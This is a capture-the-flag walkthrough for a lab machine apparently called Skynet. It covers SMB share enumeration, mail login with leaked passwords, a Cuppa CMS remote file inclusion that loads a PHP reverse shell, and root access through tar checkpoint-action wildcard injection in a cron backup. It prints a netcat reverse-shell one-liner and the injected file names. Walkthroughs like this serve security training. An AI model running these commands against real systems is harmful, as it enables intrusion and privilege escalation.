# Skynet

> Nashia Holloway | May 2nd, 2020

## Task 1 Deploy and Compromise

**1. What is Miles' password for his emails?**

Inital nmap:

![](initial.png)

enum4linux:

![](share_enum.png)

`smbclient //$IP/anonymous` to connect to the share. Go to the logs directory and `get log1.txt` to pull it locally. Cat it to find list of passwords.

![](mail.png)

```
gobuster dir -u http://10.10.26.76:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Showed the squirrelmail url.

The first password in the `log1.txt` file can be used to login to the mail site with the milesdyson username. There is an email that has his changed password: ")s{A&2Z=F^n_E.B\`". We can try to login to his smb share with this.

![](smb_pass.png)

**2. What is the hidden directory?**

Login to Miles' share.

```
sudo smbclient //$IP/milesdyson -U milesdyson
```

cd into notes and grab "important.txt". 

![](important.png)

The hidden directory is found here.

![](hidden_dir.png)

**3. What is the user flag?**

```
gobuster dir -u http://10.10.26.76:80/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

We find an `administrator/` page and discover a Cuppa CMS is running.

![](cuppa.png)

There's only 1 exploit available for this CMS in exploitdb.

For the reverse shell, set the IP to tun0 and the port to whichever port netcat listens on. Start a python server `python3 -m http.server` and nc listener `nc -lnvp 80`. Then, navigate to: `ip/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.4.248:8080/php-reverse-shell.php` to spawn the shell.

We are running as the user www-data. The user flag is in `/home/milesdyson`. 

**4. What is the root flag?**

`cat /etc/crontab` shows there is a `backup.sh` script running every 1 minute. This goes to the `/var/www/html` directory and makes a backup of everything in there and saves it in `/home/milesdyson/backup`.

![](cronjob.png)

```
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.4.248 1234 > /tmp/f" > shell.sh
```

Open a nc listener and we have a root shell.
